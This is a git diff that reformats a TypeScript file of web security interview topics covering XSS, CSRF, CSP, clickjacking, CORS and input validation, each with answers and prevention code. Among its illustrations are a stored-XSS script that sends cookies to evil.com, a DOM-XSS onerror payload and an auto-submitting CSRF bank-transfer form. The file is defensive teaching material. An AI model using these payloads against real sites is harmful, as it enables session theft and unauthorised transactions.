@@ -1,25 +1,34 @@
-import type { Topic } from '../../types';
+import type { Topic } from "../../types";
 
 export const securityTopics: Topic[] = [
   {
-    id: 'web-security-attacks',
-    title: 'Web Security Attacks & Prevention',
-    description: 'Understanding critical web security vulnerabilities including XSS, CSRF, clickjacking, and injection attacks with their prevention strategies.',
-    category: 'Security',
-    difficulty: 'Advanced',
-    tags: ['XSS', 'CSRF', 'clickjacking', 'injection', 'web-security', 'vulnerabilities'],
-    overview: 'Web security is a critical concern for frontend developers. Understanding common attack vectors — how they work, their impact, and how to prevent them — is essential for building applications that protect user data, maintain trust, and comply with security standards. The most prevalent frontend security threats are Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and clickjacking.',
+    id: "web-security-attacks",
+    title: "Web Security Attacks & Prevention",
+    description:
+      "Understanding critical web security vulnerabilities including XSS, CSRF, clickjacking, and injection attacks with their prevention strategies.",
+    category: "Security",
+    difficulty: "Advanced",
+    tags: [
+      "XSS",
+      "CSRF",
+      "clickjacking",
+      "injection",
+      "web-security",
+      "vulnerabilities",
+    ],
+    overview:
+      "Web security is a critical concern for frontend developers. Understanding common attack vectors — how they work, their impact, and how to prevent them — is essential for building applications that protect user data, maintain trust, and comply with security standards. The most prevalent frontend security threats are Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and clickjacking.",
     concepts: [
-      'XSS injects malicious scripts into web pages viewed by other users',
-      'CSRF tricks authenticated users into performing unintended actions',
-      'Clickjacking overlays invisible frames to hijack user clicks',
-      'Input validation prevents malicious data from entering the system',
-      'Output encoding prevents injected data from being interpreted as code',
-      'Content Security Policy restricts which resources browsers can load'
+      "XSS injects malicious scripts into web pages viewed by other users",
+      "CSRF tricks authenticated users into performing unintended actions",
+      "Clickjacking overlays invisible frames to hijack user clicks",
+      "Input validation prevents malicious data from entering the system",
+      "Output encoding prevents injected data from being interpreted as code",
+      "Content Security Policy restricts which resources browsers can load",
     ],
     codeExamples: [
       {
-        title: 'XSS Prevention with Output Encoding',
+        title: "XSS Prevention with Output Encoding",
         code: `// VULNERABLE: directly inserting user input into HTML
 element.innerHTML = userInput; // XSS vulnerability!
 
@@ -36,11 +45,12 @@ function RawHtml({ html }: { html: string }) {
   // Only use with sanitized content!
   return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
 }`,
-        language: 'typescript',
-        explanation: 'React auto-escapes JSX expressions, but innerHTML and dangerouslySetInnerHTML bypass this protection. Always sanitize before rendering raw HTML.'
+        language: "typescript",
+        explanation:
+          "React auto-escapes JSX expressions, but innerHTML and dangerouslySetInnerHTML bypass this protection. Always sanitize before rendering raw HTML.",
       },
       {
-        title: 'CSRF Token Implementation',
+        title: "CSRF Token Implementation",
         code: `// Server generates CSRF token and includes it in the page
 // <meta name="csrf-token" content="abc123..." />
 
@@ -60,15 +70,17 @@ async function secureFetch(url: string, options: RequestInit = {}) {
     credentials: 'same-origin',
   });
 }`,
-        language: 'typescript',
-        explanation: 'CSRF tokens are unique per session and included in state-changing requests. The server validates the token before processing the request.'
-      }
+        language: "typescript",
+        explanation:
+          "CSRF tokens are unique per session and included in state-changing requests. The server validates the token before processing the request.",
+      },
     ],
-    relatedTopicIds: ['security-headers-auth'],
+    relatedTopicIds: ["security-headers-auth"],
     questions: [
       {
-        id: 'sec-1',
-        question: 'What is Cross-Site Scripting (XSS)? Explain stored, reflected, and DOM-based XSS with examples and prevention strategies.',
+        id: "sec-1",
+        question:
+          "What is Cross-Site Scripting (XSS)? Explain stored, reflected, and DOM-based XSS with examples and prevention strategies.",
         answer: `Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. It is consistently ranked among the top web security threats by OWASP. When an application includes untrusted data in its output without proper validation or encoding, an attacker can execute arbitrary JavaScript in the context of another user's browser session, potentially stealing session tokens, cookies, personal data, or performing actions on behalf of the victim.
 
 **Definition & Attack Scenario:** XSS exploits the trust a user has in a particular website. When a user visits a page with injected malicious script, their browser executes it because it appears to come from a trusted source. The impact ranges from session hijacking and cookie theft to keylogging, phishing, and complete account takeover. There are three primary types, each with a different injection mechanism.
@@ -80,7 +92,8 @@ async function secureFetch(url: string, options: RequestInit = {}) {
 **DOM-based XSS** occurs entirely in the client-side JavaScript without the malicious payload ever reaching the server. The vulnerability exists when JavaScript reads data from an attacker-controllable source (like location.hash, location.search, or document.referrer) and passes it to a dangerous sink (like innerHTML, document.write, or eval). Example: \`document.getElementById('output').innerHTML = location.hash.substring(1)\` — an attacker sends a link with \`#<img src=x onerror=alert(document.cookie)>\` and the browser executes the script.
 
 **Prevention** requires a layered approach. First, encode all output: HTML-encode when inserting into HTML context, JavaScript-encode for JavaScript context, URL-encode for URL context. React provides automatic XSS protection by escaping JSX expressions, but dangerouslySetInnerHTML, href with javascript: protocol, and server-rendered markup bypass this. Second, implement Content Security Policy (CSP) headers to restrict which scripts can execute. Third, sanitize any HTML that must be rendered raw using libraries like DOMPurify. Fourth, use HttpOnly cookies to prevent JavaScript access to session tokens even if XSS occurs. Fifth, validate and sanitize input on both client and server sides.`,
-        shortAnswer: 'XSS injects malicious scripts into web pages. Stored XSS persists in the database and affects all viewers. Reflected XSS bounces off server responses via crafted URLs. DOM-based XSS executes entirely client-side via unsafe JavaScript sinks. Prevent with output encoding, CSP headers, DOMPurify for raw HTML, HttpOnly cookies, and input validation.',
+        shortAnswer:
+          "XSS injects malicious scripts into web pages. Stored XSS persists in the database and affects all viewers. Reflected XSS bounces off server responses via crafted URLs. DOM-based XSS executes entirely client-side via unsafe JavaScript sinks. Prevent with output encoding, CSP headers, DOMPurify for raw HTML, HttpOnly cookies, and input validation.",
         code: `// STORED XSS: Malicious comment saved to database
 // Attacker submits:
 const maliciousComment = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
@@ -119,32 +132,40 @@ function SafeLink({ href, children }: { href: string; children: React.ReactNode 
 
 // PREVENTION 4: CSP Header (server-side)
 // Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`,
-        language: 'typescript',
-        difficulty: 'Advanced',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'web-security-attacks',
-        tags: ['XSS', 'stored-XSS', 'reflected-XSS', 'DOM-XSS', 'sanitization', 'CSP'],
+        language: "typescript",
+        difficulty: "Advanced",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "web-security-attacks",
+        tags: [
+          "XSS",
+          "stored-XSS",
+          "reflected-XSS",
+          "DOM-XSS",
+          "sanitization",
+          "CSP",
+        ],
         commonMistakes: [
           'Trusting React to prevent all XSS — dangerouslySetInnerHTML and href="javascript:" bypass protection',
-          'Only sanitizing on the client side — server-side encoding is also essential',
-          'Using a blocklist approach (filtering <script>) instead of allowlist (permitting safe tags only)',
-          'Assuming URL parameters are safe because they come from your own site'
+          "Only sanitizing on the client side — server-side encoding is also essential",
+          "Using a blocklist approach (filtering <script>) instead of allowlist (permitting safe tags only)",
+          "Assuming URL parameters are safe because they come from your own site",
         ],
         followUps: [
-          'How does Content Security Policy prevent XSS even if injection occurs?',
-          'What is the difference between input validation and output encoding?',
-          'How does React\'s JSX escaping work under the hood?'
+          "How does Content Security Policy prevent XSS even if injection occurs?",
+          "What is the difference between input validation and output encoding?",
+          "How does React's JSX escaping work under the hood?",
         ],
         interviewTips: [
-          'Explain all three XSS types with concrete attack scenarios',
-          'Show layered defense: encoding + CSP + sanitization + HttpOnly cookies',
-          'Mention that XSS is consistently in the OWASP Top 10 to show awareness of industry standards'
-        ]
+          "Explain all three XSS types with concrete attack scenarios",
+          "Show layered defense: encoding + CSP + sanitization + HttpOnly cookies",
+          "Mention that XSS is consistently in the OWASP Top 10 to show awareness of industry standards",
+        ],
       },
       {
-        id: 'sec-2',
-        question: 'What is CSRF (Cross-Site Request Forgery)? How does it work and what are the prevention mechanisms?',
+        id: "sec-2",
+        question:
+          "What is CSRF (Cross-Site Request Forgery)? How does it work and what are the prevention mechanisms?",
         answer: `**Definition:** Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to perform unintended actions on a web application where they're currently authenticated. Unlike XSS which exploits the trust a user has in a website, CSRF exploits the trust a website has in the user's browser — specifically, the browser's automatic inclusion of cookies (including session cookies) with every request to a domain.
 
 **Attack Scenario:** Consider a banking application where transferring money requires a POST request to \`/api/transfer\` with parameters for recipient and amount. The user is logged in and has a valid session cookie. The attacker creates a malicious webpage containing a hidden form that auto-submits a transfer request to the bank's API. When the victim visits the attacker's page (perhaps via a phishing email link), their browser automatically sends the request with the bank's session cookie attached. The bank's server sees a valid session cookie and processes the transfer — the user has no idea it happened.
@@ -155,7 +176,8 @@ The attacker's page contains a form with \`action="https://bank.com/api/transfer
 **Impact:** CSRF can lead to unauthorized fund transfers, email address changes, password changes, data deletion, or any state-changing action the authenticated user can perform. It's particularly dangerous because it operates silently and requires no JavaScript execution on the target site — even a simple img tag can trigger a GET-based CSRF attack.
 
 **Prevention** uses multiple complementary strategies. CSRF tokens (synchronizer tokens) are the primary defense: the server generates a unique, unpredictable token per session (or per request) and embeds it in forms. Every state-changing request must include this token, which the server validates. Since the attacker's page can't read the target site's DOM (same-origin policy), they can't obtain the CSRF token. SameSite cookies (SameSite=Strict or SameSite=Lax) prevent the browser from sending cookies on cross-origin requests. Double-submit cookies send the CSRF token both as a cookie and as a request header/body — the server verifies they match. Origin/Referer header checking validates that the request originated from the expected domain. Modern frameworks like Next.js and Express include CSRF protection middleware.`,
-        shortAnswer: 'CSRF tricks authenticated users into making unintended requests by exploiting automatic cookie inclusion. An attacker creates a page that submits a forged request to the target site, and the browser attaches the victim\'s session cookie automatically. Prevent with CSRF tokens, SameSite cookies, double-submit cookies, and Origin header validation.',
+        shortAnswer:
+          "CSRF tricks authenticated users into making unintended requests by exploiting automatic cookie inclusion. An attacker creates a page that submits a forged request to the target site, and the browser attaches the victim's session cookie automatically. Prevent with CSRF tokens, SameSite cookies, double-submit cookies, and Origin header validation.",
         code: `// CSRF Attack: Attacker's malicious page
 // <form id="attack" action="https://bank.com/api/transfer" method="POST">
 //   <input type="hidden" name="recipient" value="attacker-account" />
@@ -212,32 +234,39 @@ async function doubleSubmitFetch(url: string, options: RequestInit = {}) {
 //   }
 //   next();
 // }`,
-        language: 'typescript',
-        difficulty: 'Advanced',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'web-security-attacks',
-        tags: ['CSRF', 'session-security', 'SameSite', 'CSRF-token', 'authentication'],
+        language: "typescript",
+        difficulty: "Advanced",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "web-security-attacks",
+        tags: [
+          "CSRF",
+          "session-security",
+          "SameSite",
+          "CSRF-token",
+          "authentication",
+        ],
         commonMistakes: [
-          'Relying only on CORS for CSRF protection — CORS doesn\'t prevent form submissions',
-          'Using CSRF tokens in GET requests — tokens in URLs can leak via Referer headers',
-          'Not using SameSite=Strict or Lax on session cookies',
-          'Assuming SPA architecture alone prevents CSRF — API endpoints still need protection'
+          "Relying only on CORS for CSRF protection — CORS doesn't prevent form submissions",
+          "Using CSRF tokens in GET requests — tokens in URLs can leak via Referer headers",
+          "Not using SameSite=Strict or Lax on session cookies",
+          "Assuming SPA architecture alone prevents CSRF — API endpoints still need protection",
         ],
         followUps: [
-          'How does SameSite=Lax differ from SameSite=Strict?',
-          'Why doesn\'t CORS prevent CSRF attacks?',
-          'How do SPAs handle CSRF differently from server-rendered apps?'
+          "How does SameSite=Lax differ from SameSite=Strict?",
+          "Why doesn't CORS prevent CSRF attacks?",
+          "How do SPAs handle CSRF differently from server-rendered apps?",
         ],
         interviewTips: [
-          'Clearly explain the mechanism: browser sends cookies automatically, attacker exploits this',
-          'Distinguish CSRF from XSS — they exploit different trust relationships',
-          'Show multiple prevention layers: tokens + SameSite + Origin checking'
-        ]
+          "Clearly explain the mechanism: browser sends cookies automatically, attacker exploits this",
+          "Distinguish CSRF from XSS — they exploit different trust relationships",
+          "Show multiple prevention layers: tokens + SameSite + Origin checking",
+        ],
       },
       {
-        id: 'sec-3',
-        question: 'What is Content Security Policy (CSP) and how does it protect against attacks?',
+        id: "sec-3",
+        question:
+          "What is Content Security Policy (CSP) and how does it protect against attacks?",
         answer: `**Definition:** Content Security Policy (CSP) is a security HTTP response header that allows web developers to control which resources (scripts, styles, images, fonts, frames) the browser is allowed to load and execute for a given page. It acts as a whitelist of trusted content sources, providing a powerful defense-in-depth layer against XSS, data injection, and clickjacking attacks.
 
 **Attack Scenario CSP Prevents:** Without CSP, if an attacker manages to inject a script tag via XSS (e.g., through a stored XSS vulnerability in a comment field), the browser executes it without question because there's no policy restricting which scripts can run. With a CSP like \`script-src 'self'\`, the browser blocks any script that doesn't originate from the same domain — even if the injected script tag exists in the HTML, it won't execute. This makes CSP a critical second line of defense when input sanitization fails.
@@ -247,7 +276,8 @@ async function doubleSubmitFetch(url: string, options: RequestInit = {}) {
 **Impact:** CSP significantly reduces the impact of XSS vulnerabilities even when they exist. Without CSP, a successful XSS attack can load external scripts, exfiltrate data to any domain, and embed the page in attacker frames. With a strict CSP, the attacker's injected code is severely limited — they can't load external scripts, can't send data to unauthorized domains, and the page can't be framed. CSP violation reports (via report-uri or report-to directives) also alert you to potential attacks in real time.
 
 **Prevention and Implementation:** Start with \`Content-Security-Policy-Report-Only\` to test your policy without breaking anything — violations are reported but not enforced. Gradually tighten the policy by adding specific source directives: script-src for JavaScript, style-src for CSS, img-src for images, connect-src for fetch/XHR destinations, font-src for fonts, and frame-ancestors to control who can embed your page. Use nonces or hashes instead of 'unsafe-inline' for necessary inline scripts. The strictest practical policy is \`script-src 'nonce-{random}'\` combined with \`strict-dynamic\` which allows nonced scripts to load additional scripts.`,
-        shortAnswer: 'CSP is an HTTP header that whitelists trusted content sources. It prevents XSS by blocking unauthorized scripts even if injection occurs, stops data exfiltration by restricting connect-src, and prevents clickjacking via frame-ancestors. Use Report-Only mode first, then enforce. Prefer nonces over unsafe-inline for inline scripts.',
+        shortAnswer:
+          "CSP is an HTTP header that whitelists trusted content sources. It prevents XSS by blocking unauthorized scripts even if injection occurs, stops data exfiltration by restricting connect-src, and prevents clickjacking via frame-ancestors. Use Report-Only mode first, then enforce. Prefer nonces over unsafe-inline for inline scripts.",
         code: `// Basic CSP header examples
 
 // Strict CSP: only same-origin scripts with nonces
@@ -309,32 +339,38 @@ app.post('/api/csp-report', (req, res) => {
   });
   res.status(204).end();
 });`,
-        language: 'typescript',
-        difficulty: 'Advanced',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'web-security-attacks',
-        tags: ['CSP', 'Content-Security-Policy', 'security-headers', 'XSS-prevention', 'nonce'],
+        language: "typescript",
+        difficulty: "Advanced",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "web-security-attacks",
+        tags: [
+          "CSP",
+          "Content-Security-Policy",
+          "security-headers",
+          "XSS-prevention",
+          "nonce",
+        ],
         commonMistakes: [
-          'Using unsafe-inline and unsafe-eval which defeat CSP\'s XSS protection purpose',
-          'Not starting with Report-Only mode, breaking the site with an overly strict initial policy',
-          'Setting CSP too loosely (allowing *.example.com) which can be bypassed',
-          'Forgetting to include all required source domains, breaking legitimate functionality'
+          "Using unsafe-inline and unsafe-eval which defeat CSP's XSS protection purpose",
+          "Not starting with Report-Only mode, breaking the site with an overly strict initial policy",
+          "Setting CSP too loosely (allowing *.example.com) which can be bypassed",
+          "Forgetting to include all required source domains, breaking legitimate functionality",
         ],
         followUps: [
-          'What is the difference between nonce-based and hash-based CSP?',
-          'How does strict-dynamic simplify CSP deployment?',
-          'What are the limitations of CSP set via meta tags vs. HTTP headers?'
+          "What is the difference between nonce-based and hash-based CSP?",
+          "How does strict-dynamic simplify CSP deployment?",
+          "What are the limitations of CSP set via meta tags vs. HTTP headers?",
         ],
         interviewTips: [
-          'Explain CSP as a defense-in-depth layer — it doesn\'t replace input sanitization',
-          'Mention the deployment strategy: Report-Only → gradual tightening → enforcement',
-          'Know the key directives: script-src, connect-src, frame-ancestors'
-        ]
+          "Explain CSP as a defense-in-depth layer — it doesn't replace input sanitization",
+          "Mention the deployment strategy: Report-Only → gradual tightening → enforcement",
+          "Know the key directives: script-src, connect-src, frame-ancestors",
+        ],
       },
       {
-        id: 'sec-4',
-        question: 'What is clickjacking and how do you prevent it?',
+        id: "sec-4",
+        question: "What is clickjacking and how do you prevent it?",
         answer: `**Definition:** Clickjacking (also called UI redress attack) is a technique where an attacker tricks a user into clicking on something different from what they perceive they're clicking on. The attacker creates a malicious page that loads the target website in a transparent or disguised iframe, overlaying it with deceptive content. When the user thinks they're clicking a button on the attacker's page, they're actually clicking a button on the hidden target site.
 
 **Attack Scenario:** An attacker wants to trick users into changing their email settings on a social media site. They create a page advertising a free prize with a "Claim Prize" button. Behind this visible page, they load the target site's settings page in an invisible iframe, positioned so the "Save Changes" button aligns exactly with the "Claim Prize" button. The iframe has a pre-filled email change form (using URL parameters or stored preferences). When the user clicks "Claim Prize," they actually click "Save Changes" on the real site, changing their email to the attacker's address — potentially enabling an account takeover via password reset.
@@ -344,7 +380,8 @@ app.post('/api/csp-report', (req, res) => {
 **Impact:** Clickjacking can lead to unauthorized actions including changing account settings, making purchases, enabling camera/microphone access (via browser permission dialogs), liking/sharing content on social media, or clicking ads for click fraud. In severe cases, it enables multi-step attacks where each click performs a different action, gradually achieving complex unauthorized operations like money transfers.
 
 **Prevention** relies on several complementary mechanisms. The X-Frame-Options header tells browsers whether the page can be displayed in a frame. \`DENY\` prevents all framing, \`SAMEORIGIN\` allows framing only by the same origin. CSP's frame-ancestors directive is the modern replacement: \`frame-ancestors 'none'\` is equivalent to X-Frame-Options: DENY but more flexible — you can whitelist specific origins that are allowed to frame your page. For JavaScript-based protection, frame-busting scripts detect when a page is loaded in an iframe and break out: \`if (window.top !== window.self) { window.top.location = window.self.location; }\`. However, frame-busting can be defeated by sandbox attributes, so HTTP headers are the reliable defense.`,
-        shortAnswer: 'Clickjacking loads a target site in a transparent iframe, tricking users into clicking hidden elements. Attackers overlay deceptive UI that aligns with real buttons on the hidden page. Prevent with X-Frame-Options: DENY, CSP frame-ancestors \'none\', and frame-busting JavaScript. HTTP headers are the most reliable defense.',
+        shortAnswer:
+          "Clickjacking loads a target site in a transparent iframe, tricking users into clicking hidden elements. Attackers overlay deceptive UI that aligns with real buttons on the hidden page. Prevent with X-Frame-Options: DENY, CSP frame-ancestors 'none', and frame-busting JavaScript. HTTP headers are the most reliable defense.",
         code: `// ATTACK: Attacker's clickjacking page
 // <style>
 //   iframe {
@@ -401,32 +438,39 @@ if (window.top !== window.self) {
 // CSS fallback: hide content when framed
 // <style>body { display: none; }</style>
 // JavaScript reveals content only when not framed`,
-        language: 'typescript',
-        difficulty: 'Intermediate',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'web-security-attacks',
-        tags: ['clickjacking', 'iframe', 'X-Frame-Options', 'frame-ancestors', 'UI-redress'],
+        language: "typescript",
+        difficulty: "Intermediate",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "web-security-attacks",
+        tags: [
+          "clickjacking",
+          "iframe",
+          "X-Frame-Options",
+          "frame-ancestors",
+          "UI-redress",
+        ],
         commonMistakes: [
-          'Relying only on JavaScript frame-busting which can be defeated by sandbox attributes',
-          'Using X-Frame-Options but not CSP frame-ancestors — modern browsers prefer CSP',
-          'Setting SAMEORIGIN when the page should never be framed (use DENY instead)',
-          'Forgetting to protect sensitive action pages like settings, payment, and account management'
+          "Relying only on JavaScript frame-busting which can be defeated by sandbox attributes",
+          "Using X-Frame-Options but not CSP frame-ancestors — modern browsers prefer CSP",
+          "Setting SAMEORIGIN when the page should never be framed (use DENY instead)",
+          "Forgetting to protect sensitive action pages like settings, payment, and account management",
         ],
         followUps: [
-          'What is the difference between X-Frame-Options and CSP frame-ancestors?',
-          'How can sandbox attributes on iframes defeat frame-busting scripts?',
-          'What is a cursor-jacking attack?'
+          "What is the difference between X-Frame-Options and CSP frame-ancestors?",
+          "How can sandbox attributes on iframes defeat frame-busting scripts?",
+          "What is a cursor-jacking attack?",
         ],
         interviewTips: [
-          'Draw the visual: invisible iframe over decoy UI makes the attack concept clear',
-          'Show the progression from JavaScript frame-busting to HTTP headers',
-          'Mention that frame-ancestors in CSP is the modern, recommended approach'
-        ]
+          "Draw the visual: invisible iframe over decoy UI makes the attack concept clear",
+          "Show the progression from JavaScript frame-busting to HTTP headers",
+          "Mention that frame-ancestors in CSP is the modern, recommended approach",
+        ],
       },
       {
-        id: 'sec-5',
-        question: 'What is CORS and how does it relate to web security? Explain preflight requests and common CORS misconfigurations.',
+        id: "sec-5",
+        question:
+          "What is CORS and how does it relate to web security? Explain preflight requests and common CORS misconfigurations.",
         answer: `**Definition:** Cross-Origin Resource Sharing (CORS) is a security mechanism that allows servers to declare which origins (domain, protocol, port) are permitted to access their resources via browser-initiated HTTP requests. It relaxes the Same-Origin Policy (SOP), which by default prevents web pages from making requests to domains different from the one that served the page. CORS is enforced by browsers, not servers — the server sends CORS headers, and the browser decides whether to allow the frontend code to access the response.
 
 **Attack Scenario CORS Prevents:** Without CORS and the Same-Origin Policy, any website could make authenticated requests to any other website. A malicious page at evil.com could use fetch to call bank.com's API with the user's cookies, read the response containing account data, and exfiltrate it. CORS prevents this by requiring bank.com to explicitly opt in to allowing requests from evil.com via the Access-Control-Allow-Origin header. If bank.com doesn't include evil.com in its allowed origins, the browser blocks the JavaScript from reading the response.
@@ -436,7 +480,8 @@ if (window.top !== window.self) {
 **Impact of Misconfigurations:** The most dangerous CORS misconfiguration is \`Access-Control-Allow-Origin: *\` combined with \`Access-Control-Allow-Credentials: true\` — this would allow any website to make authenticated requests and read the response. Fortunately, browsers explicitly block this combination. However, a common vulnerability is dynamically reflecting the Origin header value into Access-Control-Allow-Origin without validation. An attacker's origin is reflected, granting their site access to authenticated API responses. Always validate origins against a strict allowlist.
 
 **Prevention:** Maintain a strict allowlist of permitted origins and validate against it. Never reflect the Origin header without checking it against the allowlist. Avoid \`Access-Control-Allow-Origin: *\` for APIs that use cookies or authentication. Limit \`Access-Control-Allow-Methods\` to only the HTTP methods your API actually uses. Set \`Access-Control-Max-Age\` to cache preflight responses and reduce OPTIONS request overhead. For APIs that don't need cross-origin access, don't set CORS headers at all — the default Same-Origin Policy is the most secure option.`,
-        shortAnswer: 'CORS allows servers to declare which origins can access their resources, relaxing the Same-Origin Policy. Browsers enforce CORS by checking Access-Control-Allow-Origin headers. Preflight OPTIONS requests check permissions before complex cross-origin requests. Misconfiguring CORS (reflecting arbitrary origins, using wildcard with credentials) creates serious security holes.',
+        shortAnswer:
+          "CORS allows servers to declare which origins can access their resources, relaxing the Same-Origin Policy. Browsers enforce CORS by checking Access-Control-Allow-Origin headers. Preflight OPTIONS requests check permissions before complex cross-origin requests. Misconfiguring CORS (reflecting arbitrary origins, using wildcard with credentials) creates serious security holes.",
         code: `// Express CORS configuration
 import cors from 'cors';
 
@@ -492,32 +537,39 @@ async function fetchData(url: string): Promise<Response> {
     throw error;
   }
 }`,
-        language: 'typescript',
-        difficulty: 'Advanced',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'web-security-attacks',
-        tags: ['CORS', 'same-origin-policy', 'preflight', 'Access-Control', 'cross-origin'],
+        language: "typescript",
+        difficulty: "Advanced",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "web-security-attacks",
+        tags: [
+          "CORS",
+          "same-origin-policy",
+          "preflight",
+          "Access-Control",
+          "cross-origin",
+        ],
         commonMistakes: [
-          'Using Access-Control-Allow-Origin: * for APIs that require authentication',
-          'Reflecting the request Origin header without validating against an allowlist',
-          'Thinking CORS is enforced by the server — it\'s enforced by the browser',
-          'Not handling preflight caching (Access-Control-Max-Age), causing excessive OPTIONS requests'
+          "Using Access-Control-Allow-Origin: * for APIs that require authentication",
+          "Reflecting the request Origin header without validating against an allowlist",
+          "Thinking CORS is enforced by the server — it's enforced by the browser",
+          "Not handling preflight caching (Access-Control-Max-Age), causing excessive OPTIONS requests",
         ],
         followUps: [
-          'What requests trigger a preflight and what don\'t?',
-          'How does CORS interact with cookies and credentials?',
-          'What is the difference between CORS and Same-Origin Policy?'
+          "What requests trigger a preflight and what don't?",
+          "How does CORS interact with cookies and credentials?",
+          "What is the difference between CORS and Same-Origin Policy?",
         ],
         interviewTips: [
-          'Emphasize that CORS is browser-enforced, not server-enforced',
-          'Walk through the preflight flow: OPTIONS → server responds → browser decides → actual request',
-          'Highlight the most dangerous misconfiguration: reflecting arbitrary origins with credentials'
-        ]
+          "Emphasize that CORS is browser-enforced, not server-enforced",
+          "Walk through the preflight flow: OPTIONS → server responds → browser decides → actual request",
+          "Highlight the most dangerous misconfiguration: reflecting arbitrary origins with credentials",
+        ],
       },
       {
-        id: 'sec-6',
-        question: 'Explain input validation and output encoding. Why do you need both for secure applications?',
+        id: "sec-6",
+        question:
+          "Explain input validation and output encoding. Why do you need both for secure applications?",
         answer: `**Definition:** Input validation is the process of verifying that user-supplied data conforms to expected formats, types, lengths, and business rules before processing it. Output encoding (also called output escaping) is the process of transforming data so it's treated as content rather than executable code when inserted into different output contexts (HTML, JavaScript, CSS, URLs). Together, they form a defense-in-depth strategy against injection attacks.
 
 **Attack Scenario:** Without input validation, an attacker can submit a form field containing \`<script>alert('XSS')</script>\` where a name is expected. Without output encoding, when this "name" is displayed on a page using innerHTML, the browser executes the script. Input validation would reject the input because names don't contain angle brackets. Output encoding would convert \`<\` to \`&lt;\` when rendering, preventing the browser from interpreting it as HTML. Either defense alone can fail — validation might miss an edge case, or encoding might be forgotten in one output location. Both together provide layered protection.
@@ -527,7 +579,8 @@ async function fetchData(url: string): Promise<Response> {
 **Impact:** Input validation without output encoding is insufficient because validation is hard to get right — there are always edge cases, encoding tricks, and novel bypass techniques. A WAF (Web Application Firewall) or validation rule that blocks \`<script>\` can be bypassed with \`<img onerror=...>\` or Unicode tricks. Output encoding without input validation is also insufficient because it doesn't prevent business logic issues — a user could submit a 10MB string, a negative price, or a date in the year 3000. Both are necessary for different reasons: validation for data integrity and business rules, encoding for preventing injection.
 
 **Prevention best practices:** Validate on both client (for UX) and server (for security) — never trust client-side validation alone. Use allowlist validation (only permit known-good patterns) rather than blocklist validation (trying to filter known-bad patterns). For output encoding, use context-appropriate encoding functions and rely on framework-provided auto-escaping (React's JSX, template engines' default encoding). Never use innerHTML, eval, or document.write with user data. Parameterize database queries to prevent SQL injection. Use TypeScript's type system to enforce data shapes at compile time as an additional validation layer.`,
-        shortAnswer: 'Input validation verifies data conforms to expected formats before processing. Output encoding transforms data to prevent interpretation as code when rendered. Both are needed: validation prevents bad data and business logic issues, encoding prevents injection even if validation misses an edge case. Validate server-side with allowlists; encode based on output context.',
+        shortAnswer:
+          "Input validation verifies data conforms to expected formats before processing. Output encoding transforms data to prevent interpretation as code when rendered. Both are needed: validation prevents bad data and business logic issues, encoding prevents injection even if validation misses an edge case. Validate server-side with allowlists; encode based on output context.",
         code: `// INPUT VALIDATION: Server and client
 import { z } from 'zod';
 
@@ -601,32 +654,39 @@ function UserProfile({ name }: { name: string }) {
 function UnsafeProfile({ html }: { html: string }) {
   return <div dangerouslySetInnerHTML={{ __html: html }} />; // NO encoding!
 }`,
-        language: 'typescript',
-        difficulty: 'Intermediate',
-        type: 'Conceptual',
-        category: 'Security',
-        topicId: 'web-security-attacks',
-        tags: ['input-validation', 'output-encoding', 'sanitization', 'zod', 'XSS-prevention'],
+        language: "typescript",
+        difficulty: "Intermediate",
+        type: "Conceptual",
+        category: "Security",
+        topicId: "web-security-attacks",
+        tags: [
+          "input-validation",
+          "output-encoding",
+          "sanitization",
+          "zod",
+          "XSS-prevention",
+        ],
         commonMistakes: [
-          'Only validating on the client side — client validation can be bypassed entirely',
-          'Using blocklist validation (filter bad patterns) instead of allowlist (permit good patterns)',
-          'Applying the same encoding for all contexts — HTML, URL, and JS require different encoding',
-          'Trusting framework auto-escaping without understanding where it doesn\'t apply'
+          "Only validating on the client side — client validation can be bypassed entirely",
+          "Using blocklist validation (filter bad patterns) instead of allowlist (permit good patterns)",
+          "Applying the same encoding for all contexts — HTML, URL, and JS require different encoding",
+          "Trusting framework auto-escaping without understanding where it doesn't apply",
         ],
         followUps: [
-          'How do you validate file uploads securely?',
-          'What is the difference between sanitization and validation?',
-          'How does Zod compare to Yup for schema validation?'
+          "How do you validate file uploads securely?",
+          "What is the difference between sanitization and validation?",
+          "How does Zod compare to Yup for schema validation?",
         ],
         interviewTips: [
-          'Explain why both are needed: validation for data quality, encoding for injection prevention',
-          'Use the layered defense analogy: each layer catches what the other misses',
-          'Mention Zod or similar runtime validation libraries for TypeScript projects'
-        ]
+          "Explain why both are needed: validation for data quality, encoding for injection prevention",
+          "Use the layered defense analogy: each layer catches what the other misses",
+          "Mention Zod or similar runtime validation libraries for TypeScript projects",
+        ],
       },
       {
-        id: 'sec-7',
-        question: 'What are secure cookie attributes (HttpOnly, Secure, SameSite) and how do they protect user sessions?',
+        id: "sec-7",
+        question:
+          "What are secure cookie attributes (HttpOnly, Secure, SameSite) and how do they protect user sessions?",
         answer: `**Definition:** Secure cookie attributes are configuration flags that control how browsers handle cookies, providing protection against common attacks like XSS-based cookie theft, man-in-the-middle interception, and CSRF. The three primary security attributes — HttpOnly, Secure, and SameSite — each address a specific threat vector, and together they form a robust defense for session management.
 
